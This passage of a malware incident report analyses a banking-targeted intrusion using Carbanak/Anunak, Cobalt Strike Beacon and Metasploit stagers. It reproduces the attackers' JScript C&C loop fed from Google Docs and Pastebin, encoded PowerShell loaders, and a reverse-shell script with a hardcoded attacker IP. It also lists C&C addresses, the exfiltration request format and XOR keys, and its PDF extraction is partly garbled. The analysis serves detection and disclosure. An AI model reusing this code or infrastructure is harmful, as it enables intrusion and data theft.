+ \ufb01\\\\\ndttsg.txt\n\ufb02 );\n        var version = \ufb011.0\ufb02;\n  \nvar linkPB = \ufb01http://pastebin.com/raw/MfQV5e6R\ufb02;\n  \nvar keyPath = \ufb01HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\nlasts\ufb02;\n  \n \nWshShell.CurrentDirectory = GLBFolderPlus;\n        Log();\n        \nGetCommand();\n      \n{last: \ufb01abc123\ufb02, code: \ufb01ZGltIHh4eA==\ufb02}\n     \n 17\nFigure 30. \n \nArguments from Pastebin\nFigure 31. \n \nPastebin account used for tracking\nContinuing into the execution of GetCommand() it connects again to Google Docs, using the spreadsheet key \nobtained in the output of the LoadLinkSettings() and saves the data into the LanCradDriver.ini \u02dcle. The latter \u02dcle was \ninitially created as an empty \u02dcle and now it becomes another key component during the operation. \n \nvar cod_data = Base64.decode(cmb_ob.c);\n \n       \nif(cod_data == \ufb01#\ndeleteBot\n#\ufb02){\n \ndestroy();\n \n}else if(cod_data == \ufb01#\nGetCompInfo\n#\ufb02){\n \nLog(\ufb01$stdOut$\ufb02 + GetComputerInform());\n}else if(cod_data == \ufb01#\nGetProcList\n#\ufb02){\n \nLog(\ufb01$stdOut$\ufb02 + GetCompProcess());\n        \n \n}else if( cod_data.indexOf(\ufb01#\nRunCMDLine\n#\ufb02) !== -1){\n \nvar cmd_str = split(cod_data,\u2122#RunCMDLine#\u2122,2);\n \nLog(\ufb01$stdOut$\ufb02 + RunCMDLine(cmd_str[1]));\n \n}else{\n \nvar tempname1 = \ufb01LanCradDriver.ini\ufb02;\n \nvar tempname2 = \ufb01LanCradDriver.vbs\ufb02;\n \nvar tmpPath = GLBFolderPlus;\n \nvar tempath1 = tmpPath + \ufb01\\\\\ufb02+tempname1;\n \nvar tempath2 = tmpPath + \ufb01\\\\\ufb02+tempname2;\n \n \nvar f = FSO.OpenTextFile(tempath1,2,false,-1);\n \nf.Write(cod_data);\n \nf.Close();\n 18\nFigure 32. \n \nDownloading code from Google Docs (truncated)\nThe actual data which is Base64 encoded as seen in the Google spreadsheet  is then decoded and stored in the \nLanCradDriver.ini \u02dcle. \nFigure 33. \n \nEncoded PowerShell commands retrieved from Google Spreadsheet\nContents of the new \u02dcle, LanCradDriver.ini, reveal that it is actually a VBScript executing a PowerShell script. As a \n\u02dcnal step TransbaseOdbcDriver.js executes LanCradDriver.vbs using wscript.exe.\n \nfunction \nGetCommand\n() {\n    try {\n  \nvar legc = getLastExeGoogCmd();\n  \nvar cmb_ob = {}\n\n  \nvar go_com = InetRead(\ufb01\nhttps://docs.google.com/spreadsheet/ccc?key=\ufb02 + \nspreadsheetkey\n);\n  \nif( go_com[\u201astat\u2122] >= 200 &&  go_com[\u201astat\u2122] < 300){\n  \nvar cmd_txt = HTMLParse(go_com[\u201atext\u2122]).document.documentElement.innerText;\n   \nvar command = split(cmd_txt,\u2122$$$\u2122,3);\n \n   \nif (command.length == 4) {\n    \ncmb_ob.c = command[2];\n    \ncmb_ob.l = command[1];\n\n.\n. \n.\n  \nvar tempname1 = \ufb01\nLanCradDriver.ini\n\ufb02;\n  \nvar tempname2 = \ufb01\nLanCradDriver.vbs\n\ufb02;\n  \nvar tmpPath = GLBFolderPlus;\n  \nvar tempath1 = tmpPath + \ufb01\\\\\ufb02+tempname1;\n  \nvar tempath2 = tmpPath + \ufb01\\\\\ufb02+tempname2;\n    \n  \nvar f = FSO.OpenTextFile(tempath1,2,false,-1);\n  \nf.Write(cod_data);\n  \nf.Close();\n     \n  \nWScript.Sleep(5000);\n  \nWshShell.Run(\u201a\nwscript.exe\n \ufb01\u2122 + \ntempath2\n + \u201a\ufb02\u2122,0,false);\n     \n    \n  \n}\n \n \n}\n  \n 19\nFigure 34. \n \nLaCradDriver.ini (truncated)\nLanCradDriver.vbs\nThis script simply reads and executes the commands written in the LanCradDriver.ini \u02dcle (by the \nTransbaseOdbcDriver.js script). \nHash Type\nValue\nMD5\n4EC7088AAC32C94A7046810925BC1697\nSHA-1\n7B46BB249485B36C318D53FA070D945EA8DBF606\nSHA256\n313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\nSSDeep\n384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPh\u02dc\nTable 3. \n \nHashes of LanCradDriver.vbs\nFigure 35. \n \nLanbCradDriver.vbs\nLanCradDriver.ini\nAs seen before TransbaseOdbcDriver.js connects to Google Docs and reads a cell located in a spreadsheet in \nBase64 encoded format. After decoding, the data is then stored as a text \u02dcle in LanCradDriver.ini \nHash Type\nValue\nMD5\nEADF92DE422989D86214AF7E4E5647D7\nSHA-1\n8427358C4C21B7A0C14D638DF1017D0A7FA21182\nSHA256\nDEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D\nSSDeep\n192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5\nTable 4. \n \nHashes of LanCradDriver.ini\nThe following is a PowerShell command retrieved from the Google spreadsheet and written to the LanCradDriver.ini \n\u02dcle post-execution of TransbaseOdbcDriver.js script on the infected system. \n \nOn Error Resume Next\nSet objShell = CreateObject(\ufb01Wscript.Shell\ufb02)\n \nobjShell.Run(\ufb01C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\\npowershell.exe\n -NoP -NonI \n- ExecutionPolicy Bypass -C \ufb01\ufb02sal a New-Object;iex(a IO.StreamReader((a IO.Compression.\nOn Error Resume Next\nDim objFSO, strFile, ReadAllTextFile\nSet objFSO = CreateObject(\ufb01Scripting.FileSystemObject\ufb02)\nDim currDir, currDirPlus\nSet objFSO = CreateObject(\ufb01Scripting.FileSystemObject\ufb02)\ncurrDir = objFSO.GetParentFolderName(Wscript.ScriptFullName)\ncurrDirPlus = currDir\nstrFile = currDirPlus & \ufb01\\\nLanCradDriver.ini\n\ufb02\nSet objFile = objFSO.OpenTextFile(strFile,1,false,-1)\nIf objFile.AtEndOfStream Then\n \nReadAllTextFile = \ufb01\ufb02\nElse\n \nReadAllTextFile = objFile.ReadAll\nEnd If\nobjFile.Close\nExecuteGlobal ReadAllTextFile\n 20\nFigure 36. \n \nLanCradDriver.ini (truncated)\nNotice above the usage of Base64 encoding and De\u02daate in order to conceal the actual PowerShell code.\nUpon successful execution of TransBaseOdbcDriver.js this is how the folder contents look. Note that \n \nLanCradDriver.ini is no longer a zero-byte \u02dcle since it has been populated using the commands retrieved from \n \nthe Google spreadsheet.\n \nFigure 37. \n \nLanCradDriver.ini populated post-execution of TransbaseOdbcDriver.js\n \nActivity Summary \nIn summary, the role of the four dropped \u02dcles is visually represented by the following activity diagram:\nFigure 38. \n \nRole of dropped \u02dcles and sequence of execution\nOn Error Resume Next\nSet objShell = CreateObject(\ufb01Wscript.Shell\ufb02)\n \nobjShell.Run(\ufb01C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\\npowershell.exe\n -NoP -NonI -Execu\n-\ntionPolicy Bypass -C \ufb01\ufb02sal a New-Object;iex(a IO.StreamReader((a IO.Compression.\n([IO.\nMemoryStream][Convert]::\nFromBase64String\n(\u201arVhtT+NIEv7uX9ETWYqjSawEhtGK00oXAuxEQyAimWHv2GjU2JWkD8edb\nbeB7Nz896tqtxPbMRyMlg/E7q56uqq6Xu0Ox+xX1vx44B/ \n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n  \njKlOmDez/vDi7NTln0ygrC1p+bhLsljUMuEhrn8HavF2q4UI39vaUv3Pw==\u2122),[IO.Compression.CompressionMode]::Dec\nompress)),[Text.Encoding]::ASCII)).ReadToEnd()\ufb02\ufb02\ufb02),0, True\n \nobjShell.Run(\ufb01powershell.exe -NoP -NonI -ExecutionPolicy Bypass -C \ufb01\ufb02sal a New-Object;iex(a \n-\ntT+NIEv7uX9ETWYqjSawEhtGK00oXAuxEQyAimWHv2GjU2JWkD8edbbeB7Nz896tqtxPbMRyMlg/E7q56uqq6Xu0Ox+xX1vx44B\n/0uv7Bkd876DUddyyVxvWjQ8f9KpROedSPIhngkhunUeS4AwVcw3SJP+Fu9YYLfS7VRMSLCK7u/gOB3m3+fnX9+exf+ \n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n /epSVJVi+dz+WUsUgMgO3acu69CHy731X7rV0tCYglqJOBPYVpfsNCM+OjqPFxgnN/3h\n9Nt0ODq7+jKlOmDez/vDi7NTln0ygrC1p+bhLsljUMuEhrn8HavF2q4UI39vaUv3Pw==\u2122),[IO.Compression.CompressionM\node]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()\ufb02\ufb02\ufb02),0, True\n 21\nThe following diagram is a visualization of the Command & Control mechanism used by the malware during this \noperation that involves use of Pastebin, Google Docs (spreadsheets), and Google Forms to exert control over the \ninfected systems. \nFigure 39. \n \nActivity diagram showing C&C involving Google Forms and Docs\n 22\nFigure 40. \n \nActivity diagram showing C&C in case Google Spreadsheet not available\nUsing such a topology of C&C, while not rare, further indicates that we are dealing with a highly organized and \nsophisticated group of attackers rather than an opportunistically motivated, relatively unorganized group or lone \n \nwolf attackers. \n 23\nACHIEVING PERSISTENCE \nPowerShell Script \nAt this point the recently downloaded from Google Docs PowerShell script was decoded and executed on the \ninfected system. As seen in Figure 36 the actual script used PowerShell De\u02daate and Base64 functions to conceal \nthe payload. After reversing these functions, the output indicates that this script was designed to setup a form of \npersistent backdoor often referred to as a TCP reverse connect shell. \nThe following results has been derived: \n\u0141\n \nScript connects to an external IP using a common port such as 80. However, it is not using HTTP protocol for transmission.\n\u0141\n \nMemory allocation and thread creation code exist. \n\u0141\n \nIt receives an encrypted (XOR) payload from the external IP.\n\u0141\n \nThe payload is then decrypted using XOR key of 0x50 and written directly to memory. \nFigure 41. \n \nTCP Reverse Shell from a PowerShell script\n$IP = \u201a\n80. 84.49.61\n\u2122\n$Port = \n80\n$XORKEY = 0x50\n$\nVirtualAlloc\n = $null\n$\nCreateThread\n = $null\n$WaitForSingleObject = $null\n$XORKEY = 0x50\nfunction \nXorByteArr\n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n  \n{\n$tcpClient = New-Object System.Net.Sockets.TCPClient\nTry\n{\n$connect = $tcpClient.Connect($IP, $Port)\n}\n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n  \n$stream = $TcpClient.GetStream()\nWrite-Output \ufb01Payload size - $payloadSize\ufb02\n0x1000 ), 0x3000, 0x\n40)\n[Int]$bytesRead = 0\nWhile ($payloadSize -gt $bytesRead)\n{\n$bytesRead += $netAnswerSize\n}\nXorByteArr\nCopy-ToUnmanagedMem\nWrite-Output \ufb01Received payload, run it in a new thread\ufb02\n[IntPtr]::Zero)\nif ($threadHandle -ne [IntPtr]::Zero)\n{\nWrite-Output \ufb01Successfully created thread!\ufb02\nWrite-Output \ufb01Meterpreter session created!\ufb02\n}\n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n  \n 24\nThe \u02dcnal result of the above script is a memory resident malware providing reverse shell access to cybercriminals. \nAttackers have now successfully achieved persistence into the target infrastructure. The PowerShell command used \nto decode and execute this script along with the method of delivery has many similarities with \ufb01PowerSploit - A \nPowerShell Post-Exploitation Framework\ufb02 and \ufb01Veil Framework\ufb02 well known capable of Antivirus evasion of payloads. \nRegistry Autorun\nAdditionally, attackers have achieved persistence by utilizing the \ufb01usual suspects\ufb02 also known as the operating \nsystem\u2122s startup locations. The following key is created in the registry to start the payload automatically after reboot.\nFigure 42. \n \nRegistry persistence\nTask Scheduler\nFinally, a scheduled task has been created which is triggered every 30 minutes inde\u02dcnitely. The name of the created \ntask is SysChecks and it executes the starter.vbs.\nFigure 43. \n \nSysCheks Scheduled Task persistence\nEverything has been copied under the user temporary directory. \ufb01C:\\Users\\<user pro\u02dcle>\\AppData\\Local\\Temp\ufb02, \nwhich is also very common among malware operations because every user maintains full access within this \n \nspeci\u02dcc directory.\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TransbaseOdbcDriver\n 25\nLATERAL MOVEMENT\nPass the Hash \nAnother consequence of the initial phase of this compromise is that attackers gained access to a local Windows OS \nadministrator account and then utilized pass-the-hash in order to steal credentials of a domain level, high privileged user.\n \nFigure 44. \n \nEvent showing Pass-the-Hash indicators\nEvent ID 4624 displayed above shows the use of a local account performing network logon (Logon Type:3) using a \nrandomized source computer name (Workstation Name: T5NMapiY4kGetJDe),  probably the result of an automated tool. \nPass the hash is a technique where attackers, after successfully taking control of a system, steal credential hashes \nthat are then used to perform authentication to other systems. This technique always bene\u02dcts attackers especially if \nlocal accounts share the same password within the infrastructure. \nUltimately this allowed attackers to achieve domain or even enterprise admin access and gain network access by \nutilizing several resources as Command & Control points in Europe and US.\nFurther investigation of the attacked infrastructure showed that the intruders deployed similar PowerShell scripts or \nembedded batch \u02dcles in order to spread within the environment. A large number of internal systems recorded events \nsimilar to the ones listed below:\n \n 26\nFigure 45. \n \nBatch \u02dcle used for spreading\nFigure 46. \n \nPowerShell script used for spreading\nDuring this operation several PowerShell scripts were discovered similar to the initial one downloaded from Google \nDocs. The major difference among them was the C&C IP, which was one of several hosts located in Europe.\n \nSource:        Service Control Manager\nDate:          09/11/2016 15:40:21\nEvent ID:      7045\nTask Category: None\nLevel:         Information\nKeywords:      Classic\nUser:          \n    \nComputer:      \n    \n     \nDescription:\nThe description for Event ID 7045 from source Service Control Manager cannot be found. Either the \ncomponent that raises this event is not installed on your local computer or the installation is \ncorrupted. You can install or repair the component on the local computer.\n \nIf the event originated on another computer, the display information had to be saved with the \nevent.\nThe following information was included with the event: \nEdAeEJcGXdXJBHeX\n%COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\EyzxpCpBHlaNQvIb.bat\nuser mode service\ndemand start\nLocalSystem\nLog Name:      System\nSource:        Service Control Manager\nDate:          09/11/2016 19:31:29\nEvent ID:      7045\nTask Category: None\nLevel:         Information\nKeywords:      Classic\nUser:          \n    \nComputer:      \n    \nDescription: \nThe description for Event ID 7045 from source Service Control Manager cannot be found. Either the \ncomponent that raises this event is not installed on your local computer or the installation is \ncorrupted. You can install or repair the component on the local computer.\nIf the event originated on another computer, the display information had to be saved with the \nevent.\nThe following information was included with the event: \ndb57729\n%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPA\n-\nGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByA\n-\nG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMADEAWAAvAFcALwBhA\n-\nFAAQgBEACsAdQBmAHcAVgAwAFYAUQBwAGkAVQBvAEoAVQBOAFoAMQBrAHkAYgBOAGYASQBjAEIAaABhAFoAUQBLAEUAUABJAEo\n-\nARQA1AHcANgA4AFEAMABkAGsAcgBwAHQAdgAvADkAdgBYAHoAUQBzA \n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\nvD89IRln4wgbO2pebAr8pjUMqHLXP6O3WJtV4qZv7e0pfsH\u2122),[IO.Compression.CompressionMode]::Decompress)),[T\next.Encoding]::ASCII)).ReadToEnd()\ufb02\nuser mode service\ndemand start\nLocalSystem\n 27\nFURTHER MALICIOUS FILES\nA Forensics Timeline Analysis of \u02dcle system activity around the same time and date as that of the \nTransbaseOdbcDriver.js and other companion \u02dcles that were dropped into the user\u2122s Temp folder, revealed the \nfollowing suspicious executables/scripts:\n1.\n \nAdobeUpdateManagementTool.vbs (connect to C&C and perform data ex\u02dcltration)\n2.\n \nUVZHDVlZ.exe (variant of Carbanak)\n3.\n \nUpdate.exe (Cobalt Strike\u2122s post-exploitation tool beacon)\n4.\n \n322.exe (TCP reverse shell)\nAnalysis of these executables found them to be of a malicious nature and primarily designed to setup persistence or \ndata ex\u02dcltration. \nAdobeUpdateManagementTool.vbs\nMalicious script written in VBScript capable of receiving commands from the attacker to download and execute EXE \u02dcles, \nVBScript or PowerShell script \u02dcles. Ex\u02dcltrated data is sent to the attacker\u2122s IP addresses through HTTP POST tunnel. \nWhile the \u02dclename observed in our investigation was AdobeUpdateManagementTool.vbs it is common for attackers \nto use different \u02dcle names in different campaigns. The hashes that identify this \u02dcle uniquely (and useful in threat \ndetection and malware analysis) are: \nHash Type\nValue\nMD5\nCE7E9C3FB2872D4F500FED248228C3AC\nSHA-1\nF040E484DA423540E0A398BAA57E00226A7689D9\nSHA256\nDDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334\nSSDeep\n192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5\nTable 5. \n \nHashes of AdobeUpdateManagementTool.vbs\nAdobeUpdateManagementTool.vbs, on execution, drops the following \u02dcles after creating a folder \n \n%AllUsersPro\u02dcle% + \ufb01\\Dropebox\ufb02 + <username> (for example: C:\\ProgramData\\DropeboxJoePC): \n\u0141\n \nscreenshot__.ps1: PowerShell script that takes a screenshot of the active desktop\n\u0141\n \nscreenshot__.png: Screenshot image captured by the PS script above is stored in this \u02dcle\n\u0141\n \nexe__.exe: Executable \u02dcle sent by the attacker\n\u0141\n \nvb__.vbs: VBscript sent by the attacker\n\u0141\n \nps1__.ps1: PowerShell script sent by the attacker\n\u0141\n \ninsatller.vbs: Updater VBS script sent by the attacker\nThis malicious script sends a specially crafted request to the attacker\u2122s Command & Control server and receives \nhashed (MD5) commands back from the server in response. These commands are then executed on the \ncompromised system. \n 28\nCommand in \nclear text\nDescription of the command\ninfo\nGets system information and sends it to the C&C server via a HTTP POST request. \nproc\nEnumerates all running process.\nscrin\nCaptures screenshot of the desktop image (this command \u02dcrst drops and executes the \u02dcle \nscreenshot    ps1 and the image is saved to screenshot    .png. The image is then sent to the C&C \nserver through HTTP POST tunnel). \nexe\nAttacker sends this command with an accompanying executable \u02dcle that is saved to exe    .exe. The \nexe \u02dcle is transient for a very short period of time on the system before getting deleted. \nvbs\nAttacker sends this command with an accompanying VBScript that is saved as vb .vbs. \nThe script is executed and the result returned is base64 encoded by the script and saved \nto a temporary \u02dcle in Windows %temp% folder. The result is sent to the control server \nthrough HTTP POST tunnel (see ex\u02dcltration detail below). Both \u02dcles result and script \u02dcles \nare deleted after the execution. \nThe results \u02dcle has the following text format: \ntype: vbs time: {current time} result: {output}\nupdate\nProvides a VBScript updater along with this command. The updater script is saved to \nthe \u02dcle insatller.vbs and then executed. The updater uninstalls its old version. This \u02dcle, \nlike others, is only brie\u02day present on the \u02dcle system and is deleted 10 seconds after \nexecution.\nps1\nThe C&C server sends this command with an accompanying PowerShell script that is \nsaved to the \u02dcle ps1    .ps. The script is executed and the results returned by the script \nare base64 encoded and saved to a temporary \u02dcle in Windows %temp% folder. The \nresults are sent to the C&C server via a HTTP POST tunnel. Both \u02dcles result and script \n\u02dcles are deleted after the execution.\nThe results \u02dcle has the following format: \ntype: ps1 time: {current time} result: {result details}\nTable 6. \n \nExamples of supported commands\nThe resulting data upon execution of every command, is ex\u02dcltrated via a HTTP POST request to the C&C server as \nshown below: \nFigure 47. \n \nHTTP POST request used to ex\u02dcltrate data from compromised system\nPOST /{random_name}.jsp?pId==={unique ID %md_id%}<<$>>{MD5 hash of Date & Time Now} \n<- encrypted in \nRC4 with hardcoded key. The POST parameters may also be iterated up to 3 times.\nUser-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 \n(KHT ML, like Gecko) Version/4.0 Mobile Safari/533.1\nCharset:utf-8\nConnection: Keep-Alive\nKeep-Alive:300\nContent-Type: \ufb01multipart/form-data; boundary=\ufb02{Random MD5 hash}\ufb02\n 29\nThe HTTP POST uses the body format below:\nFigure 48. \n \nHTTP POST method options\nThe script enters sleep mode for 3-5 minutes between each send \ufb01command \u0152 ex\u02dcltrate results\ufb02 cycle before \nrunning again. \nThe following command and control servers were identi\u02dced (it is trivial for attackers to keep changing their command \n& control servers so these IPs will most likely be different in other campaigns): \n\u0141\n \n148.251.18.75\n\u0141\n \n95.215.46.221\n\u0141\n \n95.215.46.229\n\u0141\n \n95.215.46.234\n\u0141\n \n81.17.28.124\nThis \u02dcle was not detected as malicious by ANY anti-virus tools as reported by VirusTotal. This is de\u02dcnitely a sign of \nsophistication of malware and that of the threat actors behind these attacks. \nUVZHDVlZ.exe\nThis \u02dcle is a loader for the Anunak malware which is encrypted and embedded inside this executable. The payload \n(Anunak) executable then is injected to svchost.exe and provides backdoor capabilities for attackers to connect to \nand achieve persistent access to the compromised system. The \u02dcle hashes associated with this executable are: \nHash Type\nValue\nMD5\nDD4F312C7E1C25564A8D00B0F3495E24\nSHA-1\n499E162CF3A80673890BF7FC9FCBFA51B58DAF45\nSHA256\nDDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78\nSSDeep\n6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc\nTable 7. \n \nHashes of UVZHDVlZ.exe\nInitially, the main executable decrypts two code modules embedded in its body using the XOR key \ufb01\nPsdTsr8fer3\n\ufb02 \n(without the quotes): \n\u0141\n \nThe payload loader/process injector\n\u0141\n \nThe payload itself - Anunak malware Win32 executable\nThe decryption operation is as simple as the encryption, i.e. to XOR the code with the key, skipping every 3 bytes (we \nhave discovered the decryption routine used but have not reproduced the details in this report to maintain brevity). \n--{random MD5 hash}\nContent-Disposition: form-data; name=\ufb02{random name}\ufb02\n{unique ID and current Date/Time Hash - encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=\ufb02{random name}\ufb02\npPar1c==={unique ID encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=\ufb02{random name}\ufb02\npPar2c==={command\u2122s MD5 Hash encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=\ufb02{random name}\ufb02\npPar3c==={Results/Data/StolenInformation encypted with RC4 and Base64}\n 30\nThe XOR key was identi\u02dced after disassembling the executable and \u02dcnding the instruction used to copy the XOR key \nto a heap to be used later for decrypting the loader and embedded executable (see below). \nFigure 49. \n \nXOR key detection\nAs mentioned, the Anunak payload loader is decrypted \u02dcrst followed by decryption of the Anunak malware executable: \nFigure 50. \n \nPayload decoding  \nFigure 51. \n \nStarting Anunak after decrypting it\nThe following command and control servers were identi\u02dced: \n\u0141\n \n179..43.140.85 (port: 443) \n\u0141\n \n107.181.246.189 (port: 443)\nThe execution \u02daow of this malware may be visualized (using the Procdot tool [6]) as follows:\nFigure 52. \n \nProcdot visualization of UVZHDVIZ.exe.\nInterestingly, uvzhdviz.exe is signed using a valid digital certi\u02dccate issued by a Comodo CA, and appears to have \nbeen purchased by providing possibly forged identity information of a company based in Moscow, Russia. \n \n 31\nFigure 53. \n \nDigital certi\u02dccate details of UVZHDVIZ.exe (Grand Mars)\nUVZHDVlZ.exe was not detected as malicious by ANY anti-virus tools as reported on VirusTotal. This is another \nindicator of expertly crafted malware and sophistication of the attackers behind this campaign.\nUpdate.exe \nThis executable, like the Anunak loader executable described in the analysis in the previous section, is also signed \nusing a digital certi\u02dccate issued by Comodo CA and purchased mere weeks before the malware campaign that is \nthe subject of this report. As with the other certi\u02dccate used to sign the Anunak loader executable, this certi\u02dccate was \nalso issued using the details, probably fake, of a company based in Moscow, Russia. \nHash Type\nValue\nMD5\nBACE8F2B09C2BFAB35ED9ED98B2E1B83\nSHA-1\n188D751B7530DB668B88BDB96EDA50A08C119850\nSHA256\n321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57\nSSDeep\n6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc\nTable 8. \n \nHashes of Update.exe\n \n 32\nFigure 54. \n \nDigital certi\u02dccate details of update.exe\nThis executable \u02dcle is actually a loader that creates a new thread of Cobalt Strike\u2122s post-exploitation tool called \nBeacon. The Beacon DLL is encrypted and embedded in the malware body.\nInitially, the main executable decrypts two code modules embedded in its body:\n\u0141\n \nLoader Code (itself)\n\u0141\n \nPayload PE File (embedded in its body)\nAs with the Anunak loader executable described in the previous section, this \u02dcle also uses XOR with the following \nkey \ufb01keDx8\ufb02 (without the quotes) identi\u02dced during the analysis of the disassembled code for both encryption and \ndecryption operations for both the loader code and the embedded PE executable. The \u02dcgure below shows the \ndisassembled code for decrypting the XORed code. \nFigure 55. \n \nDecryption routine with XOR key\n 33\nThe \u02dcgures below show the encrypted/decrypted loader and PE executable (payload): \nFirst the loader code: \nFigure 56. \n \nLoader Code\nThen the payload PE executable \u02dcle: \nFigure 57. \n \nPE Executable\nAfter successfully decrypting the payload executable, the payload is executed in memory. \nWhen the payload is executed, it \u02dcrst allocates memory where it will hold the decrypted beacon DLL.\nFigure 58. \n \nMemory allocation for payload\nIt will then decrypt the DLL \u02dcle. This is once again done by XORing the encrypted DLL against a block of seemingly \nrandom keys.\nFigure 59: \n \nRoutine to decrypt beacon DLL\nFigure 60. \n \nDecrypted beacon DLL\nIt will then load the DLL to a new thread. The beacon is compiled as a re\u02daective DLL [7]. This allows various payload \nstagers and the stage less artifacts to inject beacon into memory.\n \n 34\nFigure 61. \n \nRe\u02daective beacon DLL\nThe beacon DLL loops inde\u02dcnitely and sleeps for 10 secs between each loop iteration. \nThis executable implements a technique to detect the presence of malware detection/AV tools on the compromised \nsystem and/or the network. It connects externally and downloads from a hardcoded host the EICAR Anti-Malware \ntest string. This text is a special \u201adummy\u2122 string for testing security controls such AV software, IDS etc. This is an \nindication to the malware that there are no AV tools on the compromised system. \nThe following command and control servers was used: \n\u0141\n \n95.215.44.12 (HTTP)\nFigure 62. \n \nEICAR test string in X-Malware \u02dceld\nThis executable \u02dcle was not detected as malicious by ANY anti-virus tools as reported by VirusTotal as of date of \nwriting this report.  \n322.exe \nThe role of this executable named 322.exe, upon analysis, was found to establish persistent access to the \ncompromised system using a TCP reverse connect backdoor. \nThe \u02dcle hashes are provided in the table below: \nHash Type\nValue\nMD5\n5F73BEB23C45006AD952A71FA62C6F9F\nSHA-1\n14F5092E2E25EC5479FF5E0F7515A6F17674A845\nSHA256\n191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2\nSSDeep\n192:jgm5OgVo4KCobo7y/+KDRSe5fOw81j5NkDQ23C+xan9xpNhhwZhf9UVF8:H1JKCobou/+KtSLjoD5nqxIDf9UVO\nTable 9. \n \nHashes of 322.exe\nThis executable checks for an AV process on the infected system and based on what it \u02dcnds, either executes a new \nprocess \ufb01wuauclt.exe\ufb02 (if AV found), or \ufb01svchost.exe -k netsvcs\ufb02. If it is unable to execute the previous command, it \nspawns explorer.exe.  \n 35\nOn analysis of the disassembled executable code, this malware was found to accept the following three command \nline arguments: {transport} {LHOST} {LPORT}\nFor example: \n322.exe 4 127.0.0.1 53\nIt was also found that the {transport} option can have the following valid values: \n(transport} option\nInterpretation\n0\nreverse_tcp_connect with no payload encryption\n3\nsimple bind_tcp shell\n4\nreverse_tcp_connect with encrypted payload\nTable 10. \n \nValid {transport} command line options for 322.exe\nWhen the executable is run with one of the three valid options in the table above (along with the correct IP:port \ncombination), it receives a DLL payload from the IP, and injects it re\u02daectively [7] to the process it successfully \nspawned (wuauclt.exe or svchost.exe or explorer.exe). It then transfers the execution to that process. This in turn \nprovides the attackers with one of the three types of command shell access to the compromised system.  \nIt\u2122s not the \u02dcrst time that cybercriminals have utilized well-known tools since the executable is nothing more than a \ncustomized Metasploit stager responsible for downloading and executing the reverse TCP. The \u02dcnal step of 322.exe \nis to delete itself from the \u02dcle system in order to leave no trace behind.\nVirusTotal score for this malware executable was 8/57 as of last analysis. The low score, combined with the \u02dcndings \nof the analysis of the \u02dcle is indicative of a high level of sophistication on the part of the malware authors in being \nable to effectively evade a majority of the AV tools.\n \n 36\nConclusions\nDuring the investigations of several malicious executables, obfuscated PowerShell commands and scripts of Visual \nBasic and JavaScript were discovered as listed in Appendix A. Some of the executables after being downloaded by \ntheir parent process were written directly into memory and then re\u02daectively injected [7] into other processes as DLLs \nand  were deleted after performing their role. Likewise, the extended usage of PowerShell commands gives the \nadvantage to adversaries of \ufb01diskless\ufb02 aka \ufb01memory resident malware\ufb02 hidden behind the process of their scripting \nhost. Also the practice of utilizing scripts which are \u02daexible by nature is another strong advantage to attackers \nallowing them to effortlessly modify their code.\nAdditionally, the use of so many different types of malicious software strongly indicates that several entities are \ncooperating and communicating in the underground markets to exchange tools and techniques. It is also possible \nthat some of the attack\u2122s stages have been performed by different malicious groups of people and then other groups \nhave carried on. \nLikewise, the number of network hosts used globally as extraction points or Command & Control Servers is another \nindicator of organized crime operations. Their location and role is depicted below in the European region map (note: \nThree servers located in N. America not shown for simplicity).\nFigure 63. \n \nMalicious hosts geolocation \nThe fact that someone purchased and used legitimate digital certi\u02dccates issued from a reputable CA (Comodo) \nusing valid or probably fake identities, of Russian origin with details in Moscow, (Grand Mars and Forsajt Ynvest) is \nanother piece of circumstantial evidence pointing to the involvement of organized cybercrime network with strong \nmotivation to these attacks.\n 37\nThe proximity of the signature timestamps (indirectly its creation date) to the timeline of attacks suggests strongly \nthat the actors purchased these certi\u02dccates 